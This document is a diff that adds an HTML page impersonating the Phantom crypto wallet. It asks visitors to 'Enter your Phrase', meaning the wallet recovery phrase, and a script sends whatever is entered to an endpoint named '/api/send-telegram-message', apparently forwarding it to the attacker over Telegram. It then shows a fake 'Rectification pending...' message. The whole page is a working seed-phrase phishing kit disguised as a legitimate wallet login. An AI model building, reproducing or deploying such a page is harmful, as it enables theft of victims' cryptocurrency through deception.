@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Phantom — Crypto & NFT Wallet — Solana | Ethereum | Polygon</title>
+  <meta name="robots" content="index,follow">
+  <meta name="description" content="Your trusted companion for NFTs & DeFi on Solana, Ethereum, & Polygon">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="og:title" content="Phantom — Crypto & NFT Wallet — Solana | Ethereum | Polygon">
+  <meta property="og:description" content="Your trusted companion for NFTs & DeFi on Solana, Ethereum, & Polygon">
+  <meta property="og:url" content="/">
+  <meta property="og:image" content="images/og-image.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:site_name" content="Phantom">
+  <link rel="icon" href="favicon/favicon.ico" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <meta name="theme-color" content="#3C315B">
+</head>
+
+<body class="bg-[#f5f2ff] h-screen">
+  <div class="container p-5 flex">
+    <a href="index.html">
+      <img class="w-36" src="logo.svg" alt="logo">
+    </a>
+  </div>
+
+  <form id="telegramForm" class="w-full flex flex-col items-center justify-center">
+    <div class="p-5 mt-10 flex flex-col items-center justify-center">
+      <textarea name="name" id="message" class="p-2 w-full lg:w-6/12 rounded min-h-36 border border-2 border-[#ab9ff2]"></textarea>
+      <div class="text-sm text-[#aa99ec] mt-3">
+        Enter your Phrase to access your Phantom account.<br />
+      </div>
+      <button type="submit" class="px-2 py-1 w-40 rounded-lg mt-5 h-12 bg-violet-200 text-white" style="background-color: #AB9FF2;">
+        Continue
+      </button>
+    </div>
+  </form>
+
+  <script>
+    document.getElementById('telegramForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const message = document.getElementById('message').value;
+  
+        // Send the message to the serverless function (backend)
+        fetch('/api/send-telegram-message', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: message })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert('Rectification pending...');
+                window.location.href = 'index.html';
+            } else {
+                alert('Error sending message.');
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    });
+  </script>
+  
+</body>
+
+</html>
